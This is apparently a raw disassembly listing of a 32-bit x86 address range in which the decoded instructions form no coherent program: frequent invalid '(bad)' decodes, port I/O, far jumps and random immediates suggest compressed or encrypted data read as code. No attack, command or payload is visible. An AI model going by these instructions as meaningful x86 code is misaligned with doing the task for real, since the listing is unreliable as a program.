  41f114:	lods   eax,DWORD PTR ds:[esi]
  41f115:	jg     0x41f193
  41f117:	fs jmp 0x41f0df
  41f11a:	mov    al,0xf3
  41f11c:	std    
  41f11d:	mov    bh,BYTE PTR [edi]
  41f11f:	add    DWORD PTR [edi],esi
  41f121:	push   0x4c
  41f123:	(bad)  
  41f124:	jnp    0x41f18d
  41f126:	dec    BYTE PTR [ecx]
  41f128:	gs adc eax,0xa66acf43
  41f12e:	loop   0x41f0d5
  41f130:	fstp   TBYTE PTR [edx]
  41f132:	pop    ebp
  41f133:	int    0xba
  41f135:	shr    ebp,0xfa
  41f138:	inc    edi
  41f139:	daa    
  41f13a:	imul   edi,DWORD PTR [edx],0x6a
  41f13d:	(bad)  
  41f13e:	aam    0xcd
  41f140:	dec    eax
  41f141:	lods   eax,DWORD PTR ds:[esi]
  41f142:	test   BYTE PTR [ebx],dl
  41f144:	aam    0xf0
  41f146:	bound  ecx,QWORD PTR [eax-0x6a8cde76]
  41f14c:	cmp    BYTE PTR [edi],bl
  41f14e:	imul   eax,DWORD PTR [esi+0x63],0xadeb796b
  41f155:	sbb    eax,0x89d99c72
  41f15a:	lods   al,BYTE PTR ds:[esi]
  41f15b:	or     ch,bh
  41f15d:	idiv   DWORD PTR [edi]
  41f15f:	mov    ebp,0x2a27271b
  41f164:	push   esi
  41f165:	fcmovnu st,st(3)
  41f167:	xchg   edi,eax
  41f168:	push   es
  41f169:	mov    WORD PTR [eax+ecx*1],ds
  41f16c:	sar    DWORD PTR [ecx],cl
  41f16e:	xchg   ecx,eax
  41f16f:	neg    dh
  41f171:	shr    BYTE PTR ds:0xc77a9df7,1
  41f177:	fdiv   st(0),st
  41f179:	pop    ss
  41f17a:	or     BYTE PTR [edx],dh
  41f17c:	mov    edi,0x8a0d40fb
  41f181:	push   ebp
  41f182:	and    ebp,DWORD PTR [ebx+0x34]
  41f185:	shl    BYTE PTR [ebx+0x2f],cl
  41f188:	mov    cl,0x70
  41f18a:	shl    esi,1
  41f18c:	(bad)  
  41f18d:	in     eax,dx
  41f18e:	jmp    0x1cb357d5
  41f193:	je     0x41f1ed
  41f195:	mov    ds:0x412064,eax
  41f19a:	add    BYTE PTR [eax],al
  41f19c:	pop    esp
  41f19d:	mov    dh,BYTE PTR [edi-0x23800895]
  41f1a3:	mov    edi,0xd9de0759
  41f1a8:	pop    esi
  41f1a9:	cld    
  41f1aa:	mov    ebp,0x16e91c8
  41f1af:	add    BYTE PTR [ebp+0x69000002],al
  41f1b5:	push   ecx
  41f1b6:	mov    ebp,DWORD PTR [eax+0x72]
  41f1b9:	test   eax,0x854fc84e
  41f1be:	popa   
  41f1bf:	(bad)  
  41f1c0:	repnz aaa 
  41f1c2:	mov    eax,DWORD PTR [edi]
  41f1c4:	jmp    0x94c5faba
  41f1c9:	or     DWORD PTR [edx],esp
  41f1cb:	rol    ah,1
  41f1cd:	(bad)  
  41f1ce:	call   0x3791c977
  41f1d3:	add    bl,BYTE PTR [ecx-0x58]
  41f1d6:	mov    ah,0x76
  41f1d8:	xlat   BYTE PTR ds:[ebx]
  41f1d9:	jbe    0x41f237
  41f1db:	sahf   
  41f1dc:	in     eax,0x54
  41f1de:	mov    gs,edx
  41f1e0:	retf   
  41f1e1:	xor    DWORD PTR [ecx],esp
  41f1e3:	mov    al,BYTE PTR ds:0x6d9ccba3
  41f1e9:	test   eax,0x52e77bb3
  41f1ee:	or     ecx,DWORD PTR [esi+0x5f]
  41f1f1:	add    BYTE PTR [eax+0x55],0xf9
  41f1f5:	jns    0x41f215
  41f1f7:	jmp    0x6ef1afdb
  41f1fc:	(bad)  
  41f1fd:	in     eax,0xbc
  41f1ff:	push   ebp
  41f200:	fsub   QWORD PTR [ebp-0x36]
  41f203:	mov    ebp,0xbab4a695
  41f208:	add    al,0x75
  41f20a:	push   esp
  41f20b:	rcr    ah,1
  41f20d:	sahf   
  41f20e:	mov    ch,0x8e
  41f210:	jno    0x41f1ed
  41f212:	mov    esi,0xd716c886
  41f217:	lahf   
  41f218:	dec    eax
  41f219:	(bad)  
  41f21a:	push   es
  41f21b:	xchg   edx,eax
  41f21c:	mov    fs,WORD PTR [edx]
  41f21e:	loop   0x41f1a9
  41f220:	mul    BYTE PTR [edx-0x76f9a7b3]
  41f226:	jns    0x41f269
  41f228:	jae    0x41f276
  41f22a:	retf   0x111c
  41f22d:	or     esp,0xffffff8f
  41f230:	cs jmp 0x6a116c20
  41f236:	or     edi,ecx
  41f238:	pop    ebp
  41f239:	dec    ebx
  41f23a:	dec    ebx
  41f23b:	pop    es
  41f23c:	fldl2t 
  41f23e:	or     ah,al
  41f240:	fidiv  WORD PTR [ecx-0x45]
  41f243:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f244:	jne    0x41f24f
  41f246:	pop    ss
  41f247:	out    dx,al
  41f248:	dec    eax
  41f249:	rcr    DWORD PTR [ebx+0x50],cl
  41f24c:	mov    ds:0x53f1464b,al
  41f251:	mov    esp,0xcd6b9cee
  41f256:	cdq    
  41f257:	xchg   esp,eax
  41f258:	jecxz  0x41f245
  41f25a:	push   cs
  41f25b:	test   al,0x93
  41f25d:	sbb    ah,dl
  41f25f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f260:	lods   al,BYTE PTR ds:[esi]
  41f261:	jo     0x41f26a
  41f263:	xchg   edx,eax
  41f264:	jecxz  0x41f21d
  41f266:	add    al,0xf3
  41f268:	jae    0x41f27e
  41f26a:	sbb    DWORD PTR [esi],edi
  41f26c:	jo     0x41f225
  41f26e:	pop    ecx
  41f26f:	pop    eax
  41f270:	fisub  DWORD PTR [edi-0x54da4cd6]
  41f276:	dec    ecx
  41f277:	pop    ebp
  41f278:	sbb    DWORD PTR [ebp+ecx*2-0x79],ebp
  41f27c:	or     al,0x63
  41f27e:	and    dl,BYTE PTR [edi-0x10]
  41f281:	in     eax,dx
  41f282:	xchg   ecx,eax
  41f283:	and    eax,0xc216a6a8
  41f288:	loop   0x41f27f
  41f28a:	add    esp,edi
  41f28c:	jl     0x41f249
  41f28e:	sahf   
  41f28f:	in     al,dx
  41f290:	xor    eax,0x61b8a353
  41f295:	sub    esp,0xffffffd7
  41f298:	clc    
  41f299:	ss out dx,al
  41f29b:	loop   0x41f2d2
  41f29d:	add    al,0x89
  41f29f:	mov    WORD PTR ds:0x8b32349e,gs
  41f2a5:	mov    ch,0x91
  41f2a7:	addr16 xchg esi,eax
  41f2a9:	dec    edi
  41f2aa:	aas    
  41f2ab:	mov    fs,WORD PTR [eax]
  41f2ad:	cs icebp 
  41f2af:	leave  
  41f2b0:	outs   dx,BYTE PTR ds:[esi]
  41f2b1:	mov    ebx,0xa3237d0e
  41f2b6:	pop    eax
  41f2b7:	in     eax,dx
  41f2b8:	xchg   ebx,eax
  41f2b9:	sub    eax,0xc757da1e
  41f2be:	push   ss
  41f2bf:	ret    
  41f2c0:	inc    eax
  41f2c1:	fisubr DWORD PTR [edi+0x12108dd2]
  41f2c7:	das    
  41f2c8:	mov    ds,WORD PTR [eax+0x63]
  41f2cb:	repz and ebp,DWORD PTR [edx+0x4fcdfad1]
  41f2d2:	pop    edx
  41f2d3:	and    eax,0x929cfd2b
  41f2d8:	push   esi
  41f2d9:	repz pop edi
  41f2db:	push   0x56
  41f2dd:	add    eax,DWORD PTR [edx-0x29fab2f]
  41f2e3:	daa    
  41f2e4:	or     dl,BYTE PTR [eax-0x51]
  41f2e7:	sub    DWORD PTR [edi],edx
  41f2e9:	inc    esi
  41f2ea:	cwde   
  41f2eb:	sar    bh,cl
  41f2ed:	fwait
  41f2ee:	mov    esp,0x546b9f73
  41f2f3:	arpl   WORD PTR [ebx+0x1d],cx
  41f2f6:	fmulp  st(2),st
  41f2f8:	and    ebp,esp
  41f2fa:	cli    
  41f2fb:	or     DWORD PTR [ebp+0x6233869b],ecx
  41f301:	or     BYTE PTR [esi],0x8d
  41f304:	adc    al,0xa
  41f306:	ds in  eax,0x49
  41f309:	(bad)  
  41f30a:	jmp    0x8f3e44b7
  41f30f:	jbe    0x41f380
  41f311:	jge    0x41f2e6
  41f313:	fstp   st(7)
  41f315:	sbb    al,0xf4
  41f317:	jnp    0x41f34f
  41f319:	push   0xffffffd1
  41f31b:	pop    ecx
  41f31c:	rcr    BYTE PTR [edx],1
  41f31e:	(bad)  
  41f31f:	dec    eax
  41f320:	jle    0x41f38e
  41f322:	xor    ah,BYTE PTR [ebx-0x79]
  41f325:	adc    ecx,DWORD PTR [esi]
  41f327:	jp     0x41f349
  41f329:	hlt    
  41f32a:	inc    ecx
  41f32b:	mov    ecx,0x20b00b8b
  41f330:	cwde   
  41f331:	jo     0x41f35c
  41f333:	mov    eax,DWORD PTR ds:0x811e58ef
  41f339:	loope  0x41f2ea
  41f33b:	js     0x41f349
  41f33d:	fimul  DWORD PTR [eax]
  41f33f:	cmp    DWORD PTR [ebx+edx*2-0x1ee46d01],ebp
  41f346:	jno    0x41f2e2
  41f348:	enter  0x30df,0x6a
  41f34c:	cmp    al,0x5e
  41f34e:	stos   BYTE PTR es:[edi],al
  41f34f:	js     0x41f2fa
  41f351:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f352:	jae    0x41f2fd
  41f354:	iret   
  41f355:	iret   
  41f356:	push   edx
  41f357:	sub    eax,edx
  41f359:	ret    
  41f35a:	ins    BYTE PTR es:[edi],dx
  41f35b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f35c:	(bad)  
  41f35e:	cmp    eax,0x48c7fa2
  41f363:	jle    0x41f2e5
  41f365:	sti    
  41f366:	in     eax,dx
  41f367:	repnz jmp FWORD PTR [eax]
  41f36a:	xlat   BYTE PTR ds:[ebx]
  41f36b:	in     al,0x4d
  41f36d:	or     cl,bh
  41f36f:	inc    eax
  41f370:	dec    edx
  41f371:	test   dl,bh
  41f373:	aad    0xcb
  41f375:	(bad)  
  41f376:	push   edx
  41f377:	adc    DWORD PTR [ebx],0xcc43fa73
  41f37d:	aas    
  41f37e:	xor    bh,BYTE PTR [edx+eiz*1-0x62]
  41f382:	mov    dh,cl
  41f384:	mov    ebp,0xc013f394
  41f389:	sbb    DWORD PTR [edx],edi
  41f38b:	xor    edi,DWORD PTR [eax+0x5307230f]
  41f391:	lods   eax,DWORD PTR ds:[esi]
  41f392:	dec    ebx
  41f393:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f394:	enter  0x1c4e,0x52
  41f398:	frstor [ecx-0x3ea69b6d]
  41f39e:	cmp    eax,0xd15b5805
  41f3a3:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  41f3a5:	push   0x4bbc2745
  41f3aa:	int    0xe1
  41f3ac:	mov    ds:0x51fc7266,eax
  41f3b1:	sub    cl,BYTE PTR [ebx-0x3b8e1960]
  41f3b7:	arpl   WORD PTR [ebp+0x7b],ax
  41f3ba:	inc    ebp
  41f3bb:	adc    bl,0x5f
  41f3be:	push   eax
  41f3bf:	mov    dh,0xd9
  41f3c1:	jmp    0xe9d2:0x8f8db789
  41f3c8:	mov    edx,0x8be1d437
  41f3cd:	xlat   BYTE PTR ds:[ebx]
  41f3ce:	mov    ch,BYTE PTR [edi-0x2d]
  41f3d1:	(bad)  
  41f3d2:	mov    ecx,0xc97d8d47
  41f3d7:	mov    ecx,fs
  41f3d9:	test   al,0x58
  41f3db:	xchg   ebx,eax
  41f3dc:	mov    cl,BYTE PTR ds:0x918fc5dd
  41f3e2:	hlt    
  41f3e3:	push   ebx
  41f3e4:	call   0x288f40a3
  41f3e9:	stos   DWORD PTR es:[edi],eax
  41f3ea:	aas    
  41f3eb:	ja     0x41f3a9
  41f3ed:	aaa    
  41f3ee:	clc    
  41f3ef:	mov    al,0xe1
  41f3f1:	clc    
  41f3f2:	sub    BYTE PTR [edx],0xc7
  41f3f5:	arpl   WORD PTR [edi+0x58],dx
  41f3f8:	push   ebp
  41f3f9:	je     0x41f3a7
  41f3fb:	jnp    0x41f454
  41f3fd:	nop
  41f3fe:	sbb    BYTE PTR [edx+0x73],ah
  41f401:	mov    al,0xae
  41f403:	push   DWORD PTR [eax]
  41f405:	js     0x41f46b
  41f407:	(bad)  
  41f408:	retf   0x77d0
  41f40b:	or     DWORD PTR [edx+0x698309ab],eax
  41f411:	or     BYTE PTR [esp+edx*4-0x47c39f4c],bl
  41f418:	addr16 iret 
  41f41a:	jb     0x41f39d
  41f41c:	retf   0xd620
  41f41f:	inc    edx
  41f420:	mov    edi,0xe98fde7d
  41f425:	shr    DWORD PTR [ecx+0x65],1
  41f428:	xor    eax,esi
  41f42a:	jmp    0xad717062
  41f42f:	cwde   
  41f430:	sbb    esi,DWORD PTR [eax+esi*8+0x62]
  41f434:	(bad)  
  41f435:	and    bh,cl
  41f437:	pop    ecx
  41f438:	nop
  41f439:	add    BYTE PTR [eax],al
  41f43b:	add    BYTE PTR [edi-0x402578e6],ah
  41f441:	(bad)  
  41f443:	jg     0x41f3f1
  41f445:	pop    ss
  41f446:	aad    0x14
  41f448:	mov    cl,0xd0
  41f44a:	loop   0x41f4b3
  41f44c:	push   ss
  41f44d:	jno    0x41f450
  41f44f:	add    BYTE PTR [ebp+0x6d000002],al
  41f455:	jnp    0x41f49b
  41f457:	mov    esp,0xd2407a0b
  41f45c:	(bad)  [eax]
  41f45e:	push   esi
  41f45f:	pshufw mm1,QWORD PTR [edx-0x748f2906],0x9d
  41f467:	stc    
  41f468:	ret    0x64d2
  41f46b:	jecxz  0x41f403
  41f46d:	(bad)  
  41f46e:	stc    
  41f46f:	add    al,0xb7
  41f471:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f472:	xchg   esi,eax
  41f473:	xor    DWORD PTR [eax-0x4b],ebp
  41f476:	sti    
  41f477:	ret    
  41f478:	sbb    bh,BYTE PTR [ecx-0x4c8c831d]
  41f47e:	lock mov ah,BYTE PTR [edx]
  41f481:	gs jbe 0x41f47c
  41f484:	jae    0x41f4eb
  41f486:	(bad)  
  41f487:	lock lahf 
  41f489:	sahf   
  41f48a:	mov    ebp,0x4f41a065
  41f48f:	daa    
  41f490:	stc    
  41f491:	sahf   
  41f492:	cmp    al,ah
  41f494:	xchg   edi,eax
  41f495:	rol    ebx,0x16
  41f498:	mov    esi,0x14953f66
  41f49d:	enter  0xc8f5,0xe4
  41f4a1:	inc    esi
  41f4a2:	inc    esi
  41f4a3:	jecxz  0x41f493
  41f4a5:	mov    DWORD PTR [ecx],esp
  41f4a7:	pop    ss
  41f4a8:	popf   
  41f4a9:	push   es
  41f4aa:	jmp    0x633a:0x934d9506
  41f4b1:	loope  0x41f4a1
  41f4b3:	mov    bh,0x62
  41f4b5:	sub    eax,0xe1f72153
  41f4ba:	jp     0x41f536
  41f4bc:	outs   dx,BYTE PTR ds:[esi]
  41f4bd:	lahf   
  41f4be:	je     0x41f496
  41f4c0:	je     0x41f473
  41f4c2:	retf   
  41f4c3:	js     0x41f4c6
  41f4c5:	cs aam 0x5c
  41f4c8:	aas    
  41f4c9:	shl    BYTE PTR [edi],cl
  41f4cb:	adc    bl,BYTE PTR [edx+0x12]
  41f4ce:	loopne 0x41f4df
  41f4d0:	add    DWORD PTR [ebx-0x4],eax
  41f4d3:	idiv   eax
  41f4d5:	call   0xcb046811
  41f4da:	mov    edi,DWORD PTR [ebx-0x4d]
  41f4dd:	jmp    0x41f4df
  41f4df:	or     al,0xaa
  41f4e1:	add    eax,0xdf449751
  41f4e6:	pop    edx
  41f4e7:	jle    0x41f4d9
  41f4e9:	push   es
  41f4ea:	inc    ebx
  41f4eb:	mov    BYTE PTR [eax+0x31],al
  41f4ee:	mov    esi,0xb6ad7285
  41f4f3:	sbb    eax,0x6c94c178
  41f4f8:	das    
  41f4f9:	icebp  
  41f4fa:	add    eax,0x71d5f1e6
  41f4ff:	jns    0x41f54d
  41f501:	mov    ch,0xdc
  41f503:	fdiv   DWORD PTR [edi+0x2972a6aa]
  41f509:	ror    esi,0xa6
  41f50c:	jns    0x41f56d
  41f50e:	pop    es
  41f50f:	sub    edi,DWORD PTR [eax-0x59]
  41f512:	icebp  
  41f513:	mov    ecx,DWORD PTR [esi+0x15986a8f]
  41f519:	push   ecx
  41f51a:	std    
  41f51b:	rcr    eax,1
  41f51d:	(bad)  [ecx]
  41f51f:	cmp    eax,0x26693463
  41f524:	fnsave [eax+0x7ebf50bd]
  41f52a:	jno    0x41f56b
  41f52c:	fst    DWORD PTR [ebx-0x71]
  41f52f:	push   ebp
  41f530:	xlat   BYTE PTR ds:[ebx]
  41f531:	mov    esp,ebp
  41f533:	jle    0x41f4bd
  41f535:	arpl   WORD PTR [ebx],dx
  41f537:	mov    bl,0xeb
  41f539:	pop    edi
  41f53a:	xlat   BYTE PTR ds:[ebx]
  41f53b:	xor    al,0xe8
  41f53d:	icebp  
  41f53e:	leave  
  41f53f:	outs   dx,BYTE PTR ds:[esi]
  41f540:	mov    WORD PTR [ecx+ecx*4-0x54768979],gs
  41f547:	push   eax
  41f548:	fmul   st,st(5)
  41f54a:	add    esp,DWORD PTR [ebp-0x78]
  41f54d:	sti    
  41f54e:	mov    ecx,DWORD PTR [edx+0x29]
  41f551:	xor    eax,0x6580c9da
  41f556:	test   edx,esi
  41f558:	dec    edx
  41f559:	xchg   edi,eax
  41f55a:	mov    ah,0x34
  41f55c:	scas   al,BYTE PTR es:[edi]
  41f55d:	fnstsw WORD PTR [ebx-0xb]
  41f560:	push   ebx
  41f561:	inc    DWORD PTR [ecx+edx*4]
  41f564:	in     al,dx
  41f565:	add    dl,ch
  41f567:	or     DWORD PTR [eax+0x40],0x92d04430
  41f56e:	xchg   edi,eax
  41f56f:	pop    ebx
  41f570:	mov    ds:0xf1f9d610,eax
  41f575:	jno    0x41f516
  41f577:	xor    BYTE PTR [edi+0x30],dl
  41f57a:	cmc    
  41f57b:	inc    eax
  41f57c:	pop    edi
  41f57d:	push   esi
  41f57e:	xchg   ebp,eax
  41f57f:	hlt    
  41f580:	dec    ebx
  41f581:	cs ds aad 0x67
  41f585:	cmp    ah,cl
  41f587:	popa   
  41f588:	mov    ds:0x527134ef,al
  41f58d:	or     al,0x15
  41f58f:	pop    edi
  41f590:	ror    DWORD PTR [edi-0x3901a5fa],0x83
  41f597:	cli    
  41f598:	daa    
  41f599:	mov    ecx,0xb042a41b
  41f59e:	push   eax
  41f59f:	lahf   
  41f5a0:	mov    ds:0x5f8f68b4,eax
  41f5a5:	mov    bh,0x6d
  41f5a7:	jnp    0x41f53d
  41f5a9:	mov    fs,WORD PTR [eax]
  41f5ab:	mov    BYTE PTR [ebx+0x35],dl
  41f5ae:	ret    0x18b4
  41f5b1:	jg     0x41f631
  41f5b3:	cmp    DWORD PTR [edx-0x11],edi
  41f5b6:	mov    ebx,0xe0b9d915
  41f5bb:	add    DWORD PTR [edi-0x55],ebp
  41f5be:	mov    edi,?
  41f5c0:	fcom   DWORD PTR [edi]
  41f5c2:	pop    ebp
  41f5c3:	cmp    edx,DWORD PTR [eax+0x5381ebff]
  41f5c9:	(bad)  
  41f5cb:	sub    dl,BYTE PTR [edi]
  41f5cd:	dec    eax
  41f5ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f5cf:	xchg   ebx,eax
  41f5d0:	dec    ebp
  41f5d1:	rol    DWORD PTR [edi-0x5e],cl
  41f5d4:	mov    eax,ds:0x3b4e0123
  41f5d9:	popa   
  41f5da:	pop    ds
  41f5db:	xor    DWORD PTR [ebx],eax
  41f5dd:	and    eax,0x9b887111
  41f5e2:	mov    al,ds:0xe9fefa2d
  41f5e7:	push   esp
  41f5e8:	mov    esp,0xb758ee82
  41f5ed:	call   0x4d54:0x1fc44455
  41f5f4:	jp     0x41f5f4
  41f5f6:	fnstcw WORD PTR [eax+0x25]
  41f5f9:	ds jo  0x41f605
  41f5fc:	and    dh,BYTE PTR [edx]
  41f5fe:	jns    0x41f603
  41f600:	call   0x13355301
  41f605:	(bad)  
  41f606:	icebp  
  41f607:	cmp    DWORD PTR [edx],0xffffff95
  41f60a:	loope  0x41f683
  41f60c:	adc    eax,0x4d59260f
  41f611:	inc    esp
  41f612:	mov    esi,0x1deeb94c
  41f617:	fimul  DWORD PTR [ebx-0x41946d89]
  41f61d:	xlat   BYTE PTR ds:[ebx]
  41f61e:	inc    ebx
  41f61f:	sub    DWORD PTR [eax+edi*4+0x65afa49a],eax
  41f626:	or     eax,0x6d24d120
  41f62b:	adc    DWORD PTR [edx+ebp*1-0x79],ebx
  41f62f:	pop    edi
  41f630:	sbb    BYTE PTR [eax+0x61],0xdf
  41f634:	mov    dl,0xf2
  41f636:	nop
  41f637:	outs   dx,DWORD PTR ds:[esi]
  41f638:	pusha  
  41f639:	xchg   esi,eax
  41f63a:	clc    
  41f63b:	fwait
  41f63c:	mov    ebp,0x6a760775
  41f641:	cmc    
  41f642:	push   ebx
  41f643:	(bad)  
  41f644:	mov    edx,edx
  41f646:	xor    eax,0x9dcb03e
  41f64b:	xor    eax,DWORD PTR [esi]
  41f64d:	mov    dl,0x9a
  41f64f:	mov    ecx,0x3961f122
  41f654:	iret   
  41f655:	in     eax,0x7c
  41f657:	or     al,0x1
  41f659:	outs   dx,BYTE PTR ds:[esi]
  41f65a:	sub    eax,0x566eaf5e
  41f65f:	es ss dec ebp
  41f662:	jge    0x41f6e2
  41f664:	xchg   edx,eax
  41f665:	cmp    al,0x4b
  41f667:	xchg   DWORD PTR [eax],ebx
  41f669:	adc    eax,0x17e1216b
  41f66e:	call   0xc1ea21ba
  41f673:	outs   dx,DWORD PTR ds:[esi]
  41f674:	or     ah,bl
  41f676:	jmp    0x2b1179c2
  41f67b:	test   eax,0xa63fb5d5
  41f680:	xchg   edx,eax
  41f681:	int3   
  41f682:	in     eax,dx
  41f683:	in     al,0xc6
  41f685:	outs   dx,BYTE PTR ds:[esi]
  41f686:	jne    0x41f62a
  41f688:	jae    0x41f67a
  41f68a:	jecxz  0x41f6e6
  41f68c:	xor    edx,esi
  41f68e:	xchg   ecx,eax
  41f68f:	mov    ebx,0x9cf300d2
  41f694:	jns    0x41f63c
  41f696:	sbb    ch,cl
  41f698:	and    al,0xd0
  41f69a:	(bad)  
  41f69b:	sub    eax,0x7a93a
  41f6a0:	adc    al,0xb
  41f6a2:	add    al,0x61
  41f6a4:	aad    0x5b
  41f6a6:	mov    dh,0x47
  41f6a8:	push   ecx
  41f6a9:	call   0xb6fc5be
  41f6ae:	retf   0xe9e7
  41f6b1:	jp     0x41f6fe
  41f6b3:	cmp    dl,BYTE PTR [eax+0x231a73c1]
  41f6b9:	cdq    
  41f6ba:	jle    0x41f6d3
  41f6bc:	inc    edx
  41f6bd:	push   es
  41f6be:	aad    0x77
  41f6c0:	add    DWORD PTR [ebp+0x3f],edx
  41f6c3:	xor    al,0x34
  41f6c5:	xchg   DWORD PTR [esi],ecx
  41f6c7:	repnz rcl BYTE PTR [edx-0x25],0x21
  41f6cc:	les    esp,FWORD PTR [edx+0x2a071ff4]
  41f6d2:	leave  
  41f6d3:	jne    0x41f72b
  41f6d5:	inc    esp
  41f6d6:	lods   al,BYTE PTR ds:[esi]
  41f6d7:	pop    ebx
  41f6d8:	stos   BYTE PTR es:[edi],al
  41f6d9:	add    BYTE PTR [eax],al
  41f6db:	add    BYTE PTR [ebp-0x15b01f1],bl
  41f6e1:	cmc    
  41f6e2:	fistp  QWORD PTR [edi]
  41f6e4:	stc    
  41f6e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f6e6:	mov    bl,0x6e
  41f6e8:	fisubr DWORD PTR [edx-0x3e]
  41f6eb:	ds fwait
  41f6ed:	jae    0x41f6f0
  41f6ef:	add    BYTE PTR [ebp+0x34000002],al
  41f6f5:	dec    ebx
  41f6f6:	pop    ebp
  41f6f7:	mov    eax,ds:0x65b22b0c
  41f6fc:	or     BYTE PTR [edi+ebp*8+0x14de48f9],ah
  41f703:	lods   eax,DWORD PTR ds:[esi]
  41f704:	cmp    BYTE PTR [ebp+eiz*2-0x5f236bd1],ah
  41f70b:	sub    DWORD PTR ds:0x228d8cb5,0x6b
  41f712:	fldenv [ecx-0x5f7cbe32]
  41f718:	and    ebx,ebp
  41f71a:	xchg   edx,eax
  41f71b:	mov    cl,0xe7
  41f71d:	fisttp QWORD PTR cs:[ebx-0x671de3e1]
  41f724:	shl    BYTE PTR [ecx],1
  41f726:	std    
  41f727:	cwde   
  41f728:	into   
  41f729:	mov    ebp,DWORD PTR [eax+0x5b]
  41f72c:	inc    esi
  41f72d:	xchg   ebx,eax
  41f72e:	and    eax,DWORD PTR [edi]
  41f730:	xor    ecx,DWORD PTR [ebp-0x61bb58f]
  41f736:	mov    ecx,0xd16dec0b
  41f73b:	leave  
  41f73c:	adc    eax,0xbbab45e2
  41f741:	add    ch,cl
  41f743:	test   BYTE PTR [esi],cl
  41f745:	stos   DWORD PTR es:[edi],eax
  41f746:	mov    WORD PTR [eax+0x5c019bf],ds
  41f74c:	mov    ebp,0xdbe95e73
  41f751:	mov    bh,BYTE PTR [eax-0x7f73ce02]
  41f757:	aaa    
  41f758:	xchg   esp,eax
  41f759:	shl    DWORD PTR [ebx-0x61],cl
  41f75c:	stc    
  41f75d:	mov    eax,ds:0xffe4376a
  41f762:	xor    al,0xc3
  41f764:	sbb    edi,0x2807ada9
  41f76a:	loopne 0x41f725
  41f76c:	push   edi
  41f76d:	add    BYTE PTR ds:0x4bd7f37d,al
  41f773:	or     eax,0xc6703e95
  41f778:	rol    ebp,cl
  41f77a:	mov    ebx,0xa8e8abff
  41f77f:	ins    BYTE PTR es:[edi],dx
  41f780:	jns    0x41f7c3
  41f782:	jecxz  0x41f790
  41f784:	mov    eax,0xf43335fd
  41f789:	add    esp,ebx
  41f78b:	fidivr WORD PTR [esi]
  41f78d:	addr16 mov ebp,0xbe7e0137
  41f793:	(bad)  
  41f794:	lds    esi,FWORD PTR [esi]
  41f796:	das    
  41f797:	aad    0x76
  41f799:	push   ebx
  41f79a:	or     edi,DWORD PTR ds:0x69a2581c
  41f7a0:	and    DWORD PTR [ebx*2+0x2b599290],esi
  41f7a7:	pop    ss
  41f7a8:	push   ebp
  41f7a9:	push   ds
  41f7aa:	mov    bl,0xe6
  41f7ac:	lea    ecx,[edi-0x6e23f16b]
  41f7b2:	call   0xc50bf2b4
  41f7b7:	popf   
  41f7b8:	pop    es
  41f7b9:	std    
  41f7ba:	push   ecx
  41f7bb:	xor    al,0x1e
  41f7bd:	iret   
  41f7be:	pushf  
  41f7bf:	pusha  
  41f7c0:	(bad)  
  41f7c2:	outs   dx,DWORD PTR ds:[esi]
  41f7c3:	mov    BYTE PTR [edx+0x16a3e6f],dl
  41f7c9:	(bad)  [ebp-0x719227b9]
  41f7cf:	xlat   BYTE PTR ds:[ebx]
  41f7d0:	and    ah,BYTE PTR [edx]
  41f7d2:	xchg   ecx,eax
  41f7d3:	mov    ecx,0x54aaa63
  41f7d8:	jle    0x41f7e4
  41f7da:	scas   al,BYTE PTR es:[edi]
  41f7db:	pop    edi
  41f7dc:	retf   
  41f7dd:	inc    ecx
  41f7de:	fiadd  WORD PTR [ecx-0x7a]
  41f7e2:	lea    edi,[ebp+0xa0bf389]
  41f7e8:	pop    esp
  41f7e9:	sbb    al,0x9c
  41f7eb:	ins    BYTE PTR es:[edi],dx
  41f7ec:	mov    edi,0xc573c6fb
  41f7f1:	popa   
  41f7f2:	push   ss
  41f7f3:	and    eax,edx
  41f7f5:	mov    ah,0x17
  41f7f7:	mov    dl,0x5a
  41f7f9:	cmp    ecx,DWORD PTR [ebx]
  41f7fb:	loop   0x41f80a
  41f7fd:	push   0xffffffad
  41f7ff:	pop    ebp
  41f800:	icebp  
  41f801:	adc    BYTE PTR [ebp+0x3c],0x78
  41f805:	mov    ds:0x2f32a78b,eax
  41f80a:	js     0x41f821
  41f80c:	mov    DWORD PTR fs:[edi],ebp
  41f80f:	fmul   st,st(5)
  41f811:	xchg   edx,eax
  41f812:	pop    ss
  41f813:	mov    ebp,0xdab8800a
  41f818:	mov    ebx,0x9d1e0441
  41f81d:	mov    bl,0x89
  41f81f:	push   esi
  41f820:	or     esp,0x352e2ef4
  41f826:	lods   al,BYTE PTR ds:[esi]
  41f827:	add    DWORD PTR [ecx+ebx*2+0x13],ebx
  41f82b:	xchg   edi,eax
  41f82c:	ficomp DWORD PTR [eax+edi*1-0x35a4697e]
  41f833:	(bad)  
  41f834:	hlt    
  41f835:	ret    
  41f836:	arpl   WORD PTR [eax+0x266cd2a9],sp
  41f83c:	or     DWORD PTR [esi],esi
  41f83e:	push   esp
  41f83f:	mov    dh,0xef
  41f841:	mov    ebp,0xc5c38e05
  41f846:	sbb    bh,al
  41f848:	test   ebx,ebp
  41f84a:	fisubr DWORD PTR [edx-0xe]
  41f84d:	fild   QWORD PTR [edi+0x74ebe189]
  41f853:	jmp    0xdb85bc9c
  41f858:	and    bh,bl
  41f85a:	es leave 
  41f85c:	pusha  
  41f85d:	mov    ch,0x18
  41f85f:	cs add eax,0x4d3adee
  41f865:	sub    edi,edx
  41f867:	push   edi
  41f868:	sbb    esp,esp
  41f86a:	iret   
  41f86b:	cmp    al,0xe2
  41f86d:	push   edi
  41f86e:	push   0x7ce3a784
  41f873:	sub    al,BYTE PTR [ebp-0x3fcd19d]
  41f879:	clc    
  41f87a:	xor    esi,DWORD PTR [edx]
  41f87c:	not    BYTE PTR [ebx-0x4a]
  41f87f:	and    cl,BYTE PTR ds:0x87e6e828
  41f885:	fisub  DWORD PTR [ebp*2-0x4667a3]
  41f88c:	loopne 0x41f883
  41f88e:	outs   dx,DWORD PTR ds:[esi]
  41f88f:	retf   0xcc2a
  41f892:	xchg   edi,eax
